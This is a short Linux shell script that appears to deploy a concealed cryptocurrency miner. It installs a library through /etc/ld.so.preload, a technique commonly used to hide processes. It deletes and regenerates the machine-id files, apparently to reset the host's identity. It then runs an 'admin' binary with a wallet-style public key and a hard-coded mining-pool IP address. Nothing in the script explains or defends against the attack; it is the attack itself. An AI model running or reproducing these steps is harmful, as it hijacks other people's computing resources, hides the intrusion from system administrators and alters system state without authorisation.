mv admin.so /usr/local/lib/admin.so
mv ld.so.preload /etc/ld.so.preload
sleep 5
rm -rf /etc/machine-id
rm -rf /var/lib/dbus/machine-id
dbus-uuidgen --ensure
systemd-machine-id-setup
cat /etc/machine-id
sleep 2
./admin --pubkey 2wbiydSw8VekLhExxwSVTQP1wdLZb5QbtCC3TdUJCq2Z --no-pcie --pool 165.22.249.131:443
